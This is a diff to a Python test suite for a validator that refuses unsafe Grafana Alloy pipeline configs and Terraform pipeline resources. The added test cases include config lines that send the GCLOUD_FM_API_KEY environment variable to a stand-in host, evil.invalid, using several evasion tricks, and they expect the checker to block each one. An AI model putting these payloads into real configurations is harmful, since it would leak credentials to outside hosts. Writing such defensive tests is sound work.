@@ -102,6 +102,16 @@ BREAKS = [
     ("sys.env of a name env-allow.txt doesn't list", _auth(['username = "1"', 'password = sys.env("GRAFANA_TELEMETRY_TOKEN")']),
      "sys.env"),
     ("sys.env of a computed name", _auth(['username = "1"', 'password = sys.env("PG_" + "PASSWORD")']), "sys.env"),
+    ("a password file, even from a listed variable",
+     _auth(['username      = "1"', 'password_file = sys.env("PG_MONITOR_PASSWORD")']), "credential", "PG_MONITOR_PASSWORD\n"),
+    ("sys.env through a list", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + [sys.env][0]("GCLOUD_FM_API_KEY")'),
+     "sys.env"),
+    ("sys.env in parentheses", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + (sys.env)("GCLOUD_FM_API_KEY")'),
+     "sys.env"),
+    ("sys indexed", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + sys["env"]("GCLOUD_FM_API_KEY")'),
+     "sys.env"),
+    ("the deprecated env()", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + env("GCLOUD_FM_API_KEY")'),
+     "sys.env"),
     ("a reference alloy validate refuses", _replace("forward_to = [prometheus.relabel.shared_kafka.receiver]",
                                                     "forward_to = [prometheus.relabel.nope.receiver]"),
      "alloy validate"),
@@ -136,9 +146,9 @@ class Check(unittest.TestCase):
         return rc, out.getvalue() + err.getvalue()
 
     def test_each_break_is_refused_naming_the_file(self):
-        for name, change, rule in BREAKS:
+        for name, change, rule, *allow in BREAKS:
             with self.subTest(name):
-                rc, out = self.run_on(change(self.source))
+                rc, out = self.run_on(change(self.source), *allow)
                 self.assertEqual(rc, 1, out)
                 self.assertRegex(out, r"refused: .*shared-kafka\.alloy:\d+: %s: " % re.escape(rule))
 
@@ -179,49 +189,77 @@ class Check(unittest.TestCase):
         self.assertIn("no pipeline", err.getvalue())
 
 
-PIPELINES_TF = os.path.join(pipelines_check.STACKS, "solo7dev", "pipelines.tf")
+PIPELINES_TF = os.path.join(pipelines_check.GRAFANA, "stacks", "solo7dev", "pipelines.tf")
 RESOURCE_LINE = 'contents                   = file("${path.module}/../../pipelines/shared-kafka.alloy")'
+INLINE = '"prometheus.scrape \\"x\\" {}"'
 
 
 @unittest.skipUnless(HAVE_ALLOY or os.environ.get("CI"), "bin/alloy absent; make bootstrap installs it")
 class Resources(unittest.TestCase):
-    """Every grafana_fleet_management_pipeline reads one checked source with one literal file()."""
+    """A grafana_fleet_management_pipeline is declared only in stacks/<root>/pipelines.tf and reads one
+    checked source with one literal file()."""
 
     def setUp(self):
-        self.stacks = tempfile.mkdtemp()
-        self.addCleanup(shutil.rmtree, self.stacks)
-        os.mkdir(os.path.join(self.stacks, "solo7dev"))
+        self.tf_dir = tempfile.mkdtemp()
+        self.addCleanup(shutil.rmtree, self.tf_dir)
         with open(PIPELINES_TF) as f:
             self.tf = f.read()
         self.assertIn(RESOURCE_LINE, self.tf)
 
-    def run_on(self, tf):
-        with open(os.path.join(self.stacks, "solo7dev", "pipelines.tf"), "w") as f:
-            f.write(tf)
+    def run_on(self, files):
+        for rel, text in files.items():
+            path = os.path.join(self.tf_dir, rel)
+            os.makedirs(os.path.dirname(path), exist_ok=True)
+            with open(path, "w") as f:
+                f.write(text)
         out = io.StringIO()
         with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
-            rc = pipelines_check.main(["--stacks", self.stacks])
+            rc = pipelines_check.main(["--tf-dir", self.tf_dir])
         return rc, out.getvalue()
 
     def test_the_committed_resource_passes(self):
-        self.assertEqual(self.run_on(self.tf)[0], 0)
+        self.assertEqual(self.run_on({"stacks/solo7dev/pipelines.tf": self.tf})[0], 0)
+
+    def test_a_comment_naming_contents_passes(self):
+        tf = self.tf.replace("  matchers ", "  # contents = file(...) is the only form; } {\n  matchers ")
+        rc, out = self.run_on({"stacks/solo7dev/pipelines.tf": tf})
+        self.assertEqual(rc, 0, out)
+
+    def test_the_committed_tree_passes(self):
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            self.assertEqual(pipelines_check.main([]), 0)
 
     def test_each_break_is_refused(self):
-        heredoc = 'contents = <<-EOT\n    loki.write "cloud" {}\n  EOT'
+        here = "stacks/solo7dev/pipelines.tf"
+        resource = 'resource "grafana_fleet_management_pipeline" "x" {\n  name     = "x"\n  contents = %s\n}\n' % INLINE
         breaks = [
-            ("an inline heredoc", self.tf.replace(RESOURCE_LINE, heredoc)),
-            ("a source outside pipelines/", self.tf.replace("../../pipelines/shared-kafka.alloy", "evil.alloy")),
-            ("a source that does not exist", self.tf.replace("pipelines/shared-kafka.alloy", "pipelines/nope.alloy")),
-            ("a name that is not its source's", self.tf.replace('"shared-kafka"', '"other"', 1)),
-            ("a for_each", self.tf.replace("  enabled ", "  for_each = toset([\"a\"])\n  enabled ")),
-            ("a second resource with no file()", self.tf + '\nresource "grafana_fleet_management_pipeline" "x" {\n'
-                                                           '  name     = "x"\n  contents = "prometheus.scrape \\"x\\" {}"\n}\n'),
+            ("an inline heredoc", {here: self.tf.replace(RESOURCE_LINE, 'contents = <<-EOT\n    loki.write "c" {}\n  EOT')}),
+            ("a source outside pipelines/", {here: self.tf.replace("../../pipelines/shared-kafka.alloy", "evil.alloy")}),
+            ("a source that does not exist", {here: self.tf.replace("pipelines/shared-kafka.alloy", "pipelines/nope.alloy")}),
+            ("a name that is not its source's", {here: self.tf.replace('"shared-kafka"', '"other"', 1)}),
+            ("a for_each", {here: self.tf.replace("  enabled ", '  for_each = toset(["a"])\n  enabled ')}),
+            ("a second resource with inline contents", {here: self.tf + "\n" + resource}),
+            ("the real contents in a comment, a column-0 line, then inline contents",
+             {here: self.tf.replace(RESOURCE_LINE, "/*\n  " + RESOURCE_LINE + "\nx\n*/\n  contents = " + INLINE)}),
+            ("a heredoc whose closer is at column 0, then inline contents",
+             {here: self.tf.replace("  matchers ", "  labels   = [<<-eot\n" + RESOURCE_LINE + "\neot\n  ]\n  matchers ")
+                                .replace(RESOURCE_LINE, "contents = " + INLINE, 1)}),
+            ("a good contents line and a } in a block comment, then inline contents",
+             {here: self.tf.replace(RESOURCE_LINE, "/*\n  " + RESOURCE_LINE + "\n}\n*/\n  contents = " + INLINE)}),
+            ("a good contents line and a } in a heredoc, then inline contents",
+             {here: self.tf.replace(RESOURCE_LINE, "labels = <<-EOT\n    " + RESOURCE_LINE + "\n    }\n  EOT\n  contents = " + INLINE)}),
+            ("a resource in a module", {here: self.tf, "modules/stack/fleet.tf": resource}),
+            ("a resource in another file of the root", {here: self.tf, "stacks/solo7dev/main.tf": resource}),
+            ("a .tf.json", {here: self.tf, "stacks/solo7dev/override.tf.json": "{}"}),
         ]
-        for name, tf in breaks:
+        for name, files in breaks:
             with self.subTest(name):
-                rc, out = self.run_on(tf)
+                shutil.rmtree(self.tf_dir)
+                os.mkdir(self.tf_dir)
+                rc, out = self.run_on(files)
                 self.assertEqual(rc, 1, out)
-                self.assertRegex(out, r"refused: .*pipelines\.tf:\d+: terraform: ")
+                self.assertRegex(out, r"refused: .*\.tf(\.json)?:\d+: terraform: ")
 
 
 class Usage(unittest.TestCase):
